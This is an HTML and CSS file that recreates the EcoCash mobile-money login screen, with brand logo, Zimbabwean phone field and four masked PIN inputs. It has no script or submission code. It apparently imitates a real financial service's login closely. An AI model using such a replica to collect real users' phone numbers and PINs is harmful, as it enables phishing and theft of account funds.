<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Login – refined</title>
<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #e5e5e5;
}

.container {
  width: 100%;
  max-width: 400px;        /* slightly wider */
  margin: auto;
  background: white;
  min-height: 100vh;
  position: relative;
  overflow: hidden;
}

.main-content {
  position: relative;
  z-index: 2;
  padding-bottom: 10px;    /* space above blue curve */
}

.logo {
  text-align: center;
  font-size: 38px;
  font-weight: bold;
  margin-top: 40px;
}

.logo span:first-child {
  color: #1c6aa6;
}

.logo span:last-child {
  color: #e12b2b;
}

.login-title {
  text-align: center;
  color: #666;
  font-size: 26px;
  margin-top: 18px;
}

.phone-box {
  margin: 22px;            /* consistent left/right margin */
  border: 2px solid #1c6aa6;
  border-radius: 10px;
  display: flex;
  align-items: center;
  padding: 10px 12px;
  background: #f2f2f2;
}

.flag {
  width: 26px;
  margin-right: 8px;
}

.code {
  color: #666;
  margin-right: 10px;
  font-size: 16px;
}

.phone-input {
  border: none;
  outline: none;
  background: transparent;
  font-size: 17px;
  flex: 1;
}

.pin-title {
  text-align: center;
  color: #666;
  margin-top: 5px;
}

.pin-box {
  display: flex;
  justify-content: center;
  gap: 12px;
  margin-top: 18px;
}

.pin {
  width: 44px;
  height: 44px;
  border-radius: 10px;
  border: 2px solid #1c6aa6;
  text-align: center;
  font-size: 20px;
}

.bottom {
  position: absolute;
  bottom: 0;
  left: 0;
  right: 0;
  background: #125c9c;
  color: white;
  padding-top: 110px;
  padding-bottom: 28px;
  text-align: center;
}

.bottom::before {
  content: "";
  position: absolute;
  top: -120px;             /* curve position */
  left: -20%;
  width: 140%;
  height: 220px;
  background: white;
  border-bottom-left-radius: 50%;
  border-bottom-right-radius: 50%;
}

.bottom p {
  width: 82%;
  margin: auto;
  font-size: 15px;
  line-height: 1.4;
}

/* Buttons container – now with same horizontal margin as phone-box */
.buttons {
  display: flex;
  justify-content: center;
  gap: 14px;
  margin: 20px 22px;       /* left/right match phone-box margin */
}

.btn {
  background: white;
  border-radius: 16px;
  padding: 8px 16px;
  flex: 1;                 /* each button takes equal width */
  text-align: center;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 4px;
  cursor: pointer;
  transition: all 0.1s ease;
}

.btn svg {
  width: 22px;
  height: 22px;
  fill: #1c6aa6;
}

.btn span {
  font-size: 13px;
  color: #333;
  font-weight: bold;
  line-height: 1.2;
}

.version {
  margin-top: 24px;
  opacity: 0.85;
  font-size: 14px;
}

.terms {
  margin-top: 6px;
  font-size: 14px;
  opacity: 0.9;
}

a {
  color: white;
  text-decoration: underline;
}
</style>
</head>
<body>

<div class="container">

  <div class="main-content">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>

    <div class="login-title">Login</div>

    <div class="phone-box">
      <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag">
      <div class="code">+263</div>
      <input class="phone-input" placeholder="Phone Number" type="tel">
    </div>

    <div class="pin-title">Enter your PIN</div>

    <div class="pin-box">
      <input class="pin" type="password" maxlength="1" inputmode="numeric">
      <input class="pin" type="password" maxlength="1" inputmode="numeric">
      <input class="pin" type="password" maxlength="1" inputmode="numeric">
      <input class="pin" type="password" maxlength="1" inputmode="numeric">
    </div>
  </div>

  <div class="bottom">
    <p>To register an EcoCash wallet or get assistance, click below</p>

    <div class="buttons">
      <div class="btn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
        </svg>
        <span>Register</span>
      </div>

      <div class="btn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1-10c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
        </svg>
        <span>Help &amp; Support</span>
      </div>
    </div>

    <div class="version">v3.0.3P</div>

    <div class="terms">
      By signing in you agree to the
      <a href="#">Terms and Conditions</a>
    </div>
  </div>

</div>

</body>
</html>
